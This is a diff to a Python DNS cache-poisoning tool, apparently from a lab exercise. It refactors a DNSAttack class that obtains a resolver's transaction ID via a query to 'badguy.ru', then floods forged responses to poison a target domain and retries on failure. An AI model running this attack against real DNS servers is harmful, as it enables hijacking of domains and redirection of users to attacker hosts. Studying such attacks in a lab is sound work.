@@ -34,18 +34,23 @@ class DNSAttack:
     #
     #   @param blessing_terminal The istance of the blessing terminal (Default None)
     #
+
+
     def __init__(self, victim_server_ip, attacked_domain, bad_udp_ip, bad_udp_port,\
-         ns_server_ip=None, blessing_terminal=None, log=lambda msg: None):
+         ns_server_ip=None, blessing_terminal=None, sigint_handler=None, log_function=lambda msg: None):
         self.victim_server_ip = victim_server_ip
-        self.attacked_domain = attacked_domain
+        self.domain = attacked_domain
         self.bad_udp_ip = bad_udp_ip
         self.bad_udp_port = bad_udp_port
         self.ns_server_ip = ns_server_ip
 
         self.t = blessing_terminal
 
+        self.sigint_handler = sigint_handler
+        self.log = log_function
     #Exceptions
-    ## InitialQueryFailed
+
+    ##  InitialQueryFailed
     #   @brief Exception raised when the initial query fails
     #
     #   Raised when initial query performed to get a TXID fails    
@@ -71,7 +76,6 @@ class DNSAttack:
             received_id = data[0:2]
 
             initial_id = int.from_bytes(received_id, byteorder='big')
-            #print("RAW ID: ", received_id)
             print("ID: ", initial_id)
 
             sock.close()
@@ -88,9 +92,9 @@ class DNSAttack:
         try:
             myAnswers = victim_server.query("badguy.ru", "A")
             for rdata in myAnswers:
-                    log(rdata)
+                    self.log("Query response received")
         except:
-            log("{t.red}{t.bold}Query failed{t.normal}".format(t=self.t))
+            self.log("{t.red}{t.bold}Query failed{t.normal}".format(t=self.t))
             raise self.InitialQueryFailed
 
     #Get IP of the NS server (Unimplemented)
@@ -105,7 +109,10 @@ class DNSAttack:
 
             response = dns_server.query(ns_server, 'A')
 
-
+    ## Start
+    #   @brief Start the attack
+    #   @param number_of_tries The number of tentative (Default 50)
+    #
     def start(self, number_of_tries=50):
 
         succeded = False
@@ -114,31 +121,31 @@ class DNSAttack:
 
             time.sleep(3)
 
-            log("\n ------ {t.bold}{t.shadow}Attack Number {num}{t.normal} ------\n".format(t=self.t, num=abs(number_of_tries-20)))
+            self.log("\n ------ {t.bold}{t.shadow}Attack Number {num}{t.normal} ------\n".format(t=self.t, num=abs(number_of_tries-20)))
 
             pool = ThreadPool(processes=1)
 
-            log("Starting DNS light server")
+            self.log("Starting DNS light server")
             async_id_result = pool.apply_async(self.get_id)
 
             time.sleep(2)
             
-            log("\n\nStart sending the first request to \"{t.italic}badguy.ru{t.normal}\"".format(t=self.t))
+            self.log("\n\nStart sending the first request to \"{t.italic}badguy.ru{t.normal}\"".format(t=self.t))
             try:
                 self.send_initial_query() #Start the DNS listening server
             except self.InitialQueryFailed:
-                log("\n{t.red}Unable to get inital TXID, terminating...{t.normal}".format(t=self.t))
+                self.log("\n{t.red}Unable to get inital TXID, terminating...{t.normal}".format(t=self.t))
                 pool.terminate()    #Terminate the UDP server
                 sys.exit(-1)
 
             fetched_id = async_id_result.get()  # get the return value from your function.
 
-            log("Fetched ID: {t.green}{t.bold}{id}{t.normal}".format(t=self.t, id=fetched_id))
+            self.log("Fetched ID: {t.green}{t.bold}{id}{t.normal}".format(t=self.t, id=fetched_id))
 
-            log("Ok, the victim does not know the attack, let's try to perform \"{t.italic}Dan's Shenanigans{t.normal}\"".format(t=self.t))
+            self.log("Ok, the victim does not know the attack, let's try to perform \"{t.italic}Dan's Shenanigans{t.normal}\"".format(t=self.t))
 
 
-            poison= DNSPoisoning(victim_server_ip, "bankofallan.co.uk", '192.168.56.1', '10.0.0.1', fetched_id, sigint_handler, log)
+            poison= DNSPoisoning(self.victim_server_ip, self.domain, '192.168.56.1', '10.0.0.1', fetched_id,interrupt_handler=self.sigint_handler, log=self.log, blessing_terminal=self.t)
 
 
             #Attach SIGINT signal to the DNSPoisoning stop handler
@@ -147,16 +154,16 @@ class DNSAttack:
 
             poison.send_inital_query()
 
-            log("Now the victim server wait for response, we {t.underline}flood a mass of crafted request{t.normal}...".format(t=self.t))
+            self.log("Now the victim server wait for response, we {t.underline}flood a mass of crafted request{t.normal}...".format(t=self.t))
 
             poison.start_flooding()
 
             time.sleep(5)
 
-            log("Checking the attack results")
+            self.log("Checking the attack results")
             if poison.check_poisoning():
-                log("\n\nAttack Succeded!!!!")
+                self.log("\n\nAttack Succeded!!!!")
                 succeded = True
             else:
-                log("\n\n{t.red}{t.bold}Attack Failed{t.normal}!!!!".format(t=self.t))
+                self.log("\n\n{t.red}{t.bold}Attack Failed{t.normal}!!!!".format(t=self.t))
                 number_of_tries = number_of_tries - 1
